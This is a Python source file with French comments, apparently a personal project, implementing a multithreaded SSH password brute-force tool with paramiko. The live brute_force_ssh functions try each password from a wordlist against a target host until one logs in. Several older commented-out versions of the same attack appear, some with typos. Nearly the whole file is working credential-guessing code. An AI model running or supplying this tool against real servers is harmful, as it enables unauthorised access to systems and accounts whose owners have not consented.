import paramiko, os, threading, multiprocessing
from itertools import product
from wordlist import create_wordlist
from concurrent.futures import ThreadPoolExecutor
from display_output import display_output

# def brute_force_ssh(target, user, port, wordlist):
#     """ Brute force SSH. The function loop on each password of the wordlist and try to connect to the SSH server. 
#     If the connection is successful, the function return the password. 
#     If the connection is not successful, the function continue to loop on the next password. 
#     If the function loop on all the passwords of the wordlist and the connection is not successful, the function return "Password not found in the wordlist"""

#     wordlists = create_wordlist(wordlist)


#     for word in wordlists:

#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.WarningPolicy)

#         try:
#             print("Trying: " + word)
#             ssh.connect(target, port=port,
#                         username=user,
#                         password=word,
#                         look_for_keys=False,
#                         banner_timeout=1,
#                         timeout=1)
            
#             ssh.close()
#             output = f"Password found : '{word}'"
#             return output

#         except:
            
#             ssh.close()
#             continue
    
#     return "Password not found in the wordlist"



# def test_ssh_connection(hostname, port, username, password):
#     """
#     Teste la connexion ssh avec un nom d'utilisateur et un mot de passe donnés
#     """

#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.WarningPolicy)
#     try:
#         # client = paramiko.SSHClient()
#         # client.set_missing_host_key_policy(paramiko.WarningPolicy)
#         print(f"Trying: {password}")
#         client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3, banner_timeout=3)
#         client.close()
#         return True
#     except:
#         client.close()
#         return False



# def test_ssh_connection(hostname, port, username, password):
#     """
#     Teste la connexion ssh avec un nom d'utilisateur et un mot de passe donnés
#     """

#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.WarningPolicy)

#     try:
#         print("Trying: " + word)
#         ssh.connect(hotname, port=port,
#                     username=username,
#                     password=password,
#                     look_for_keys=False,
#                     banner_timeout=1,
#                     timeout=1)
        
#         ssh.close()
#         output = f"Password found : '{password}'"
#         return output

#     except:
#         ssh.close()


#     return "Password not found in the wordlist"
    

# def brute_force_ssh(hostname, port, username, password_list, num_threads=1):
#     """
#     Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée
#     """
#     # diviser la liste de mots de passe en sous-listes
#     num_passwords = len(password_list)
#     passwords_per_thread = num_passwords // num_threads
#     threads = []
#     for i in range(num_threads):
#         start_index = i * passwords_per_thread
#         end_index = start_index + passwords_per_thread
#         if i == num_threads - 1:
#             end_index = num_passwords
#         thread_passwords = password_list[start_index:end_index]
#         t = threading.Thread(target=brute_force_ssh_thread, args=(hostname, port, username, thread_passwords))
#         threads.append(t)
#         t.start()

#     # attendre que tous les threads se terminent
#     for t in threads:
#         t.join()

# def brute_force_ssh_thread(hostname, port, username, password_list):
#     """
#     Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée
#     """
#     for password in password_list:
#         if test_ssh_connection(hostname, port, username, password):
#             print(f"Mot de passe trouvé: {password}")
#             print(password)
#             return password
    
#     print("Mot de passe non trouvé dans la liste")














































# def display_output(user, password, success):
#     """
#     Affiche le résultat de l'attaque par force brute
#     """

#     pattern = f"{user} : {password}"
#     size = len(pattern)
#     print(size)
#     # Add multiple dote util the size of the pattern is 50
#     while size < 50:
#         pattern += "."
#         size += 1

#     if success == True:
#         print(colored("[+] ", "green") + pattern + colored(" Success", "green"))
#     else:
#         print(colored("[+] ", "yellow") + pattern + colored(" Failed", "red"))

#     # raise Exception("Fuck")



def brute_force_ssh_thread(hostname, port, username, password_list, next_password_index, found_event, password_queue):
    """
    Fonction de thread pour effectuer une attaque par force brute sur une liste de mots de passe donnée.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    while True:
        # Vérifier si un mot de passe a déjà été trouvé
        if found_event.is_set():
            # client.close()
            return

        # Récupérer l'index du prochain mot de passe à tester
        with next_password_index.get_lock():
            i = next_password_index.value
            # Si tous les mots de passe ont été testés, le thread se termine
            if i >= len(password_list):
                # client.close()
                return
            # Mettre à jour l'index pour le thread suivant
            next_password_index.value += 1

        password = password_list[i]
        try:
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=200, banner_timeout=200)
            display_output(username, password, True)
            # print(colored("[+] ", "green") + username + " : " + password + colored(" Success", "green"))
            password_queue.put(password)
            found_event.set()
            client.close()
            return
        except:
            display_output(username, password, False)
            # print(colored("[+] ", "yellow") + username + " : " + password + colored(" Success", "red"))
            client.close()
            pass


def brute_force_ssh(hostname, port, username, password_list, num_threads=4):
    """
    Effectue une attaque par force brute sur une machine virtuelle à l'aide d'une liste de mots de passe donnée.
    Utilise le multithreading pour accélérer le processus.
    """
    # Créer une variable partagée pour l'index du prochain mot de passe à tester
    next_password_index = multiprocessing.Value('i', 0)

    # Créer un Event pour signaler la fin de la recherche
    found_event = multiprocessing.Event()

    # Créer une queue pour stocker le mot de passe trouvé
    password_queue = multiprocessing.Queue()

    # Créer les threads pour tester les mots de passe
    threads = []
    for i in range(num_threads):
        thread = multiprocessing.Process(target=brute_force_ssh_thread, args=(hostname, port, username, password_list, next_password_index, found_event, password_queue))
        thread.start()
        threads.append(thread)

    # Attendre que tous les threads se terminent
    for thread in threads:
        thread.join()

    # Si un mot de passe a été trouvé, récupérer le mot de passe et le retourner
    if not password_queue.empty():
        password = password_queue.get()
        return password

    # Si aucun mot de passe n'a été trouvé, retourner None
    return None

















































































# def brute_force_ssh(target, user, port, wordlist):
#     """ Brute force SSH. The function loop on each password of the wordlist and try to connect to the SSH server. 
#     If the connection is successful, the function return the password. 
#     If the connection is not successful, the function continue to loop on the next password. 
#     If the function loop on all the passwords of the wordlist and the connection is not successful, the function return "Password not found in the wordlist"""

#     wordlists = create_wordlist(wordlist)


#     for word in wordlists:

#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.WarningPolicy)

#         try:
#             print("Trying: " + word)
#             ssh.connect(target, port=port,
#                         username=user,
#                         password=word,
#                         look_for_keys=False,
#                         banner_timeout=1,
#                         timeout=1)
            
#             ssh.close()
#             output = f"Password found : '{word}'"
#             return output

#         except:
            
#             ssh.close()
#             continue
    
#     return "Password not found in the wordlist"
